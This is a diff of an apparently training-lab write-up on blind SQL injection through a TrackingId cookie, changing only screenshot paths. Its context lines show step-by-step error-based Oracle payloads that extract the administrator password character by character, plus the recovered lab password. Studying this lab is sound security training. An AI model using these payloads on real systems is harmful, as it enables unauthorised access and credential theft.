@@ -14,9 +14,9 @@ To solve the lab, log in as the `administrator` user.
 
 **NOTE:** SQL CASE
 
-![screnshot](./images/lab12_1.png)
+![screnshot](images/lab12_1.jpg)
 
-![screnshot](./images/lab12_2.png)
+![screnshot](images/lab12_2.jpg)
 
 step 1
 
@@ -30,7 +30,7 @@ select any Request
 URL encoded Format
 then send to repeater
 
-![screnshot](./images/lab12_3.png)
+![screnshot](images/lab12_3.jpg)
 
 step 2
 
@@ -40,7 +40,7 @@ add `'` just after TrackingId
 TrackingId=eXEM2vNsn8D3g49m'
 ```
 
-![screnshot](./images/lab12_4.png)
+![screnshot](images/lab12_4.jpg)
 
 step 3
 
@@ -50,7 +50,7 @@ add `''`
 TrackingId=eXEM2vNsn8D3g49m''
 ```
 
-![screnshot](./images/lab12_5.png)
+![screnshot](images/lab12_5.jpg)
 
 step 4
 
@@ -63,7 +63,7 @@ TrackingId=eXEM2vNsn8D3g49m'||(SELECT+'')||'
 
 you will get 500 Internal Sever Error it means database don't support such query
 
-![screnshot](./images/lab12_6.png)
+![screnshot](images/lab12_6.jpg)
 
 step 5
 
@@ -77,7 +77,7 @@ URL encoded Format
 TrackingId=eXEM2vNsn8D3g49m'||(SELECT+''+FROM+DUAL)||'
 ```
 
-![screnshot](./images/lab12_7.png)
+![screnshot](images/lab12_7.jpg)
 
 step 6
 
@@ -91,7 +91,7 @@ URL encoded Format
 TrackingId=eXEM2vNsn8D3g49m'||(SELECT+''+FROM+any_table)||'
 ```
 
-![screnshot](./images/lab12_8.png)
+![screnshot](images/lab12_8.jpg)
 
 step 7
 
@@ -110,7 +110,7 @@ TrackingId=eXEM2vNsn8D3g49m'||(SELECT+''+FROM+users+WHERE+ROWNUM+%3d+1)||'
 
 you will get 200 ok response
 
-![screnshot](./images/lab12_9.png)
+![screnshot](images/lab12_9.jpg)
 
 step 8
 
@@ -129,7 +129,7 @@ TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+'
 
 Here 1 = 1 is true then 1/0 which create error so you will get Internal Server Error which means exploit work well
 
-![screnshot](./images/lab12_10.png)
+![screnshot](images/lab12_10.jpg)
 
 step 9
 
@@ -145,7 +145,7 @@ TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+(1%3d2)+THEN+TO_CHAR(1/0)+ELSE+'
 
 Here 1=2 is false then query become `'||(SELECT '' FROM DUAL)||'` which give 200 response
 
-![screnshot](./images/lab12_11.png)
+![screnshot](images/lab12_11.jpg)
 
 step 10
 
@@ -161,7 +161,7 @@ TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+'
 
 Here 1 = 1 is true then 1/0 which create error so you will get Internal Server Error which means exploit work well
 
-![screnshot](./images/lab12_12.png)
+![screnshot](images/lab12_12.jpg)
 
 step 11
 
@@ -175,7 +175,7 @@ URL encoded Format
 TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+LENGTH(password)>1+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'
 ```
 
-![screnshot](./images/lab12_13.png)
+![screnshot](images/lab12_13.jpg)
 
 step 12
 
@@ -189,10 +189,10 @@ URL encoded Format
 TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+LENGTH(password)>§1§+THEN+to_char(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'
 ```
 
-![screnshot](./images/lab12_14.png)
+![screnshot](images/lab12_14.jpg)
 
 payload position,Grep Match and after attack result shows 20 length of password
-![screnshot](./images/lab12_15.png)
+![screnshot](images/lab12_15.jpg)
 
 step 13
 
@@ -208,7 +208,7 @@ TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+SUBSTR(password,1,1)%3d'a'+THEN+
 
 Here you get 200 ok it means a is not first alphabet password
 
-![screnshot](./images/lab12_16.png)
+![screnshot](images/lab12_16.jpg)
 
 step 14
 
@@ -222,13 +222,13 @@ URL encoded Format
 TrackingId=eXEM2vNsn8D3g49m'||(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)%3d'§a§'+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator')||'
 ```
 
-![screnshot](./images/lab12_17.png)
+![screnshot](images/lab12_17.jpg)
 
 here payload 1, payload 2 and Grep Match
-![screnshot](./images/lab12_18.png)
+![screnshot](images/lab12_18.jpg)
 
 final result after attacking
-![screnshot](./images/lab12_19.png)
+![screnshot](images/lab12_19.jpg)
 
 note down each alphabet and digit from payload 2 according to payload 1
 like 1 is o and 20 is 6
@@ -238,4 +238,4 @@ step 15
 
 To solve the lab enter administrator as username and `o9z230ft5zxkrhh3k3c6` as password
 
-![screnshot](./images/lab12_20.png)
+![screnshot](images/lab12_20.jpg)
